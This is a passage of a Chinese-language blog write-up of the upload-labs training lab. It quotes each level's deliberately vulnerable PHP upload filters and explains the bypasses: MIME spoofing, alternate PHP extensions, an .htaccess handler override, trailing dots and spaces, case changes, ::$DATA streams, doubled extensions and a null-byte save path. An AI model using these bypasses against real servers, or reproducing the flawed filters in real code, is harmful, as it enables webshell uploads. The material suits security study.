class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原来是对mime类型，过滤，按题应该修改mime类型才对，这里我传的图片马，所以不用改mime类型，如果我上传的是php文件</p><p><img src="/../image/image-20240815130628995.png" alt="image-20240815130628995"></p><p><img src="/../image/image-20240815130647368.png" alt="image-20240815130647368"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>同样的思路走一遍</p><p><img src="/../image/image-20240815133057483.png" alt="image-20240815133057483"></p><p>这里应该是后端对后缀进行了过滤，我们试试双写php，看看能不能绕过</p><p><img src="/../image/image-20240815133149161.png" alt="image-20240815133149161"></p><p>可以看到成功绕过，但路径好像有变化，上传的文件会自动重命名</p><p><img src="/../image/image-20240815133255153.png" alt="image-20240815133255153"></p><p>然后，这样的后缀不懂能不能解析，试试php5</p><p><img src="/../image/image-20240815134033385.png" alt="image-20240815134033385"></p><p>好像是因为没有修改mime类型，再修改mime类型为<code>application/otect-stream</code>，还是不行，但是变成下载文件了，试试在里面加个命令，看能不能执行,还是不行，我按攻略走走试试。原来是有些东西没开</p><p>,我们需要在phpstudy的http.conf文件添加如下一行, 目的是为了让网站能够解析后缀为php5文件, 然后重启phpstudy</p><p><a href="https://blog.csdn.net/qq_52045924/article/details/132271356">phpstudy的apache服务器无法解析运行以.php5,.phtml等非.php后缀的文件的解决方法_php显示fcgidinitialenv无效-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php5</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240815140132299.png" alt="image-20240815140132299"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddHandler fcgid-script .fcgi .php .php5 .phtml</span><br><span class="line">FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000</span><br><span class="line">FcgidMaxRequestsPerProcess 1000</span><br><span class="line">FcgidMaxProcesses 15</span><br><span class="line">FcgidIOTimeout  120</span><br><span class="line">FcgidIdleTimeout  120</span><br><span class="line"># 全局默认使用的PHP版本配置</span><br><span class="line">FcgidInitialEnv PHPRC &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts&quot;</span><br><span class="line">FcgidWrapper &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot; .php </span><br><span class="line">FcgidWrapper &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot; .php5</span><br><span class="line">FcgidWrapper &quot;D:/phpstudy_pro/Extensions/php/php7.3.4nts/php-cgi.exe&quot; .phtml</span><br><span class="line"># 上传文件的最大尺寸 100MB</span><br><span class="line">FcgidMaxRequestLen 104857600</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240815143010618.png" alt="image-20240815143010618"></p><p>主要是不解析的问题，关键是要知道还可以用什么后缀绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php5、php3、phtml</span><br></pre></td></tr></table></figure><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>因为基本都过滤完了，这后面就有点难了，我就直接看按攻略走了</p><p><img src="/../image/image-20240815143224631.png" alt="image-20240815143224631"></p><p><code>.htaccess</code>文件是apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件, 可以实现网页301重定向、自定义404页面、改变文件扩展名、允许&#x2F;阻止特定的用户访问目录等等。</p><p>要注意的是, 当php版本高于5.2.17时，<code>.htaccess</code>文件上传漏洞就不再存在, 所以说这个漏洞在实战环境下几乎时不肯能存在的</p><p>自己新建一个.htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;webshell&quot;&gt;</span><br><span class="line">Sethandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>.htaccess会改变uploads这个目录下的文件解析规则, 调用php的解析器去解析一个文件名只需包含<code>“webshell”</code>字符串的任意文件</p><p>简单来说, 若一个文件的文件名为<code>webshell.jpg</code>, 其内容是<code>phpinfo()</code>, 那么apache就会调用php解析器去解析此文件</p><p>上传文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>暂时跳过这关</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里代码比较简单，正好练习下php的代码debug，我们把代码复制到phpstom，然后简单修改一下代码</p><p>deldot:删除文件名末尾的点</p><p>strrchr：查找一个字符串在另一个字符串中 末次 出现的位置，并返回从字符串中的这个位置起，一直到字符串结束的所有字符</p><p>strtolower：转换为小写</p><p>str_ireplace:去除字符串::$DATA,这个应该是其它数据就不管它了</p><p>trim：去除首尾的空格</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="string">&quot; .123.PHP. &quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// 查找一个字符串在另一个字符串中 末次 出现的位置，并返回从字符串中的这个位置起，一直到字符串结束的所有字符</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)-<span class="number">1</span>;<span class="variable">$i</span>&gt;<span class="number">0</span>;<span class="variable">$i</span>--)&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)-<span class="number">1</span> <span class="keyword">and</span> <span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$s</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$c</span> != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>,<span class="number">0</span>,<span class="variable">$i</span>+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240815152018550.png" alt="image-20240815152018550"></p><p>下个断点在deldot那，然后可以看到字符串已经被读进来了，单步执行，到deldot函数时，直接步出，可以发现尾巴的点已经没了。</p><p><img src="/../image/image-20240815152301199.png" alt="image-20240815152301199"></p><p>继续执行，可以看到strrchr就是提取后缀的作用，也就是整个串中最后一个点之后的所有内容</p><p><img src="/../image/image-20240815152439146.png" alt="image-20240815152439146"></p><p>然后就是转换成小写</p><p><img src="/../image/image-20240815152535538.png" alt="image-20240815152535538"></p><p>收尾去空没啥变化</p><p><img src="/../image/image-20240815152555938.png" alt="image-20240815152555938"></p><p>构造个绕过参数<code>5.php. .</code>注意中间的空格，再来调试试试</p><p><img src="/../image/image-20240815152726812.png" alt="image-20240815152726812"></p><p>可以看到去完点空格还是存在的，继续调试</p><p><img src="/../image/image-20240815152750594.png" alt="image-20240815152750594"></p><p>这次提取的就是点和空格了，去完空就剩个点了，而5.php.我们是可以解析的</p><p><img src="/../image/image-20240815152818470.png" alt="image-20240815152818470"></p><p>抓包改后缀</p><p><img src="/../image/image-20240815152928502.png" alt="image-20240815152928502"></p><p>访问也是成功解析了</p><p><img src="/../image/image-20240815152954804.png" alt="image-20240815152954804"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>源码分析</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>可以看到，这一关与上一关的差别就是没有进行大小转换了，所以我们可以利用纯大小或大小写混合的方法绕过，这里就用纯大写了</p><p><img src="/../image/image-20240815153649881.png" alt="image-20240815153649881"></p><p><img src="/../image/image-20240815154037207.png" alt="image-20240815154037207"></p><p>这里apahce好像不解析，我用nginx才解析出来了</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>同样将代码与之前的代码对比</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>可以发现，少了trim函数的处理，说明没有对空格进行过滤，我们可以通过添加空格来绕过，直接在文件名微步添加可</p><p><img src="/../image/image-20240815154617734.png" alt="image-20240815154617734"></p><p>访问解析</p><p><img src="/../image/image-20240815154653454.png" alt="image-20240815154653454"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>可以看到这一关是没有去点，所以我们可以通过在文件结尾加个点的方式绕过</p><p><img src="/../image/image-20240815155001184.png" alt="image-20240815155001184"></p><p>可以看到上传成功，访问解析试试</p><p><img src="/../image/image-20240815155040866.png" alt="image-20240815155040866"></p><p>可以成功解析</p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>这一关就没有对;;DATA进行替换了，这个又是什么原理</p><p><a href="https://blog.csdn.net/weixin_44032232/article/details/109005766">https://blog.csdn.net/weixin_44032232/article/details/109005766</a></p><p>在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，（也就是说，会自动过滤掉文件的后缀名)且保持::$DATA之前的文件名，他的目的就是不检查后缀名</p><p>例如:</p><p>　　“shell.php::$DATA”,   Windows会自动去掉末尾的::$DATA变成”shell.php”</p><p>所以我们可以在后面加上::$DATA进行绕过</p><p><img src="/../image/image-20240815160114610.png" alt="image-20240815160114610"></p><p>成功上传，访问解析，注意不要连着::$DATA一起访问</p><p><img src="/../image/image-20240815160230085.png" alt="image-20240815160230085"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>这一关以试利用两点中间加空格绕过和Pass-05一样，就不做解析了</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>str_ireplace:<a href="https://www.runoob.com/php/func-string-str-replace.html">https://www.runoob.com/php/func-string-str-replace.html</a></p><p>这个函数的意思就是把后缀和黑名单中的成员对比，一样就给他换成空，所以我们可以用双写的方法来试试</p><p><img src="/../image/image-20240815161718429.png" alt="image-20240815161718429"></p><p>原理就是换了一个php还有一个php，访问解析试试</p><p><img src="/../image/image-20240815161800624.png" alt="image-20240815161800624"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单分析下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>strrpos:查找 “php” 在字符串中最后一次出现的位置(大小写敏感)</p><p>获取文件名称最后一个”.”后面的字符串当作文件后缀</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>通过GET请求来获取<code>save_path</code>参数的值, 也就是说这个值是可控的, 若我们将这个值修改成<code>../upload/webshell.php%00</code>, 